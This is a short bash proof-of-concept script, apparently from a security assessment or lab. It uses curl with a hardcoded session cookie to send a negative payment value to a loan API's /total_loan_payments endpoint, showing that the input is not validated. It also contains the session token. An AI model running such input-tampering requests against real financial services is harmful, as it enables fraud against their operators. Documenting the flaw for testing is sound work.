#!/bin/bash

# POC: Business Logic Flaw - Negative Payment Value Calculation Manipulation
# This script demonstrates how the /total_loan_payments API endpoint fails to validate
# that payment values must be positive, allowing manipulation of loan calculations

TARGET_URL="http://localhost"
SESSION_COOKIE="session=eyJ1c2VyX2lkIjoxfQ.aQ4Ykg.ZGo2pHs_86FrcvvPj90ygsX8UtY"

echo "=================================================="
echo "POC: Negative Payment Value Calculation Flaw"
echo "=================================================="
echo ""

# Test 1: Legitimate positive payment value
echo "[*] Test 1: Legitimate positive payment value"
echo "Request: GET ${TARGET_URL}/total_loan_payments?principal=10000&payment=100&term=12"
RESPONSE_1=$(curl -s -H "Cookie: ${SESSION_COOKIE}" \
  "${TARGET_URL}/total_loan_payments?principal=10000&payment=100&term=12")
echo "Response: $RESPONSE_1"
echo ""

# Test 2: Negative payment value (the vulnerability)
echo "[*] Test 2: Negative payment value (VULNERABLE)"
echo "Request: GET ${TARGET_URL}/total_loan_payments?principal=10000&payment=-100&term=12"
RESPONSE_2=$(curl -s -H "Cookie: ${SESSION_COOKIE}" \
  "${TARGET_URL}/total_loan_payments?principal=10000&payment=-100&term=12")
echo "Response: $RESPONSE_2"
echo ""

# Test 3: Parse and compare results
echo "[*] Test 3: Result Analysis"
POSITIVE_TOTAL=$(echo "$RESPONSE_1" | grep -o '"total_loan_payments"[^,}]*' | grep -o '[-0-9.]*' | tail -1)
NEGATIVE_TOTAL=$(echo "$RESPONSE_2" | grep -o '"total_loan_payments"[^,}]*' | grep -o '[-0-9.]*' | tail -1)

echo "Positive payment total: $POSITIVE_TOTAL"
echo "Negative payment total: $NEGATIVE_TOTAL"
echo ""

# Verify the vulnerability
if [[ "$NEGATIVE_TOTAL" == "-1200"* ]] || [[ "$NEGATIVE_TOTAL" == "-1200.0" ]]; then
  echo "[+] VULNERABILITY CONFIRMED: Negative payment resulted in negative total_loan_payments"
  echo "[+] Calculation allowed: principal=10000, payment=-100, term=12 => total=-1200"
  exit 0
else
  echo "[-] Could not confirm vulnerability"
  exit 1
fi